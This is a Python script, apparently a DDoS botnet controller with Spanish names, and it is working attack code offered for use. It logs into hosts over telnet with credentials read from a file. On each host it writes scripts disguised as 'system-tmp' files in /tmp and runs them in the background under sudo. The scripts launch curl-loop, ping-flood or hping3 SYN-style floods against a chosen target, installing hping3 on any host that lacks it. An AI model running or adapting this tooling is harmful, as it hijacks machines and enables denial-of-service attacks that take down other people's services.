import time
import random
import telnetlib
import fileinput

ip_equipos=[]
user_equipos=[]
password_equipos=[]
hping_equipos=[]
total_equipos=0

def loadAtaque():

    global total_equipos

    with open("equipos.txt","r") as e:

        for line in e:
            ip_equipos.append(line.split(":")[0])
            user_equipos.append(line.split(":")[1])
            password_equipos.append(line.split(":")[2])
            hping_equipos.append(line.strip("\n").split(":")[3])
            total_equipos+=1

def Ataque(opcion, direccion, puerto, tipo):

    for i in range(total_equipos):

        try:
        
            tn = telnetlib.Telnet(ip_equipos[i])

            tn.read_until(b"login: ")
            tn.write(user_equipos[i].encode('ascii') + b"\n")
        
            tn.read_until(b"Password: ")
            tn.write(password_equipos[i].encode('ascii') + b"\n")
        
            lv=tn.read_until(b'Welcome',timeout=5)
            lv

            if lv == b'\r\n\r\nLogin incorrect\r\nadministrador login: ':
                print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- Error')
                tn.close()
            elif lv==b'\r\nWelcome':

                if opcion == 1:
                
                    print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- DDOSING')
                    numero=str(random.randrange(1000000, 10000000, 1))
                    tn.write(bytes("touch /tmp/system-tmp"+numero+".sh && cd /tmp && echo 'for i in {1..100000..1}; do curl "+direccion+"; done'>> system-tmp"+numero+".sh && chmod 755 system-tmp"+numero+".sh && ./system-tmp"+numero+".sh & \n", encoding="ascii"))
                    tn.write(b'exit\n')
                    time.sleep(6)
                    tn.close()

                elif opcion == 2:

                    print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- DDOSING')
                    numero=str(random.randrange(1000000, 10000000, 1))
                    tn.write(bytes("touch /tmp/system-tmp"+numero+".sh && cd /tmp && echo 'for i in {1..100000..1}; do ping -f -l 65000 -s 56500 "+direccion+"; done'>> system-tmp"+numero+".sh && chmod 755 system-tmp"+numero+".sh && sudo -S <<< "+password_equipos[i]+" ./system-tmp"+numero+".sh & \n", encoding="ascii"))
                    tn.write(b'exit\n')
                    print(tn.read_all().decode('ascii'))
                    tn.close()

                elif opcion == 3:

                    if hping_equipos[i]=="NS":

                        print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- Installing Hping3')

                        tn.write(bytes("sudo -S <<< "+password_equipos[i]+" apt install hping3 & \n", encoding="ascii"))

                        time.sleep(10)

                        textToSearch = ip_equipos[i]+":"+user_equipos[i]+":"+password_equipos[i]+":"+"NS"
                        textToReplace = ip_equipos[i]+":"+user_equipos[i]+":"+password_equipos[i]+":"+"SI"
                        fileToSearch  = "equipos.txt"
                        tempFile = open( fileToSearch, 'r+' )

                        for line in fileinput.input( fileToSearch ):
                            tempFile.write( line.replace( textToSearch, textToReplace ) )
                        tempFile.close()

                        print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- DDOSING')

                        numero=str(random.randrange(1000000, 10000000, 1))
                        tn.write(bytes("touch /tmp/system-tmp"+numero+".sh && cd /tmp && echo 'hping3 -p "+puerto+" "+tipo+" --flood "+direccion+"'>> system-tmp"+numero+".sh && chmod 755 system-tmp"+numero+".sh && sudo -S <<< "+password_equipos[i]+" ./system-tmp"+numero+".sh & \n", encoding="ascii"))
                        time.sleep(5)
                        tn.write(b'exit\n')
                        tn.close()
                        time.sleep(2)



                    elif(hping_equipos[i]=="SI"):

                        print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- DDOSING')
                        numero=str(random.randrange(1000000, 10000000, 1))
                        tn.write(bytes("touch /tmp/system-tmp"+numero+".sh && cd /tmp && echo 'hping3 -p "+puerto+" "+tipo+" --flood "+direccion+"'>> system-tmp"+numero+".sh && chmod 755 system-tmp"+numero+".sh && sudo -S <<< "+password_equipos[i]+" ./system-tmp"+numero+".sh & \n", encoding="ascii"))
                        time.sleep(5)
                        tn.write(b'exit\n')
                        tn.close()

        except:
           print(f'IP: {ip_equipos[i]} USER: {user_equipos[i]} PASS: {password_equipos[i]} --- Not Avaible')
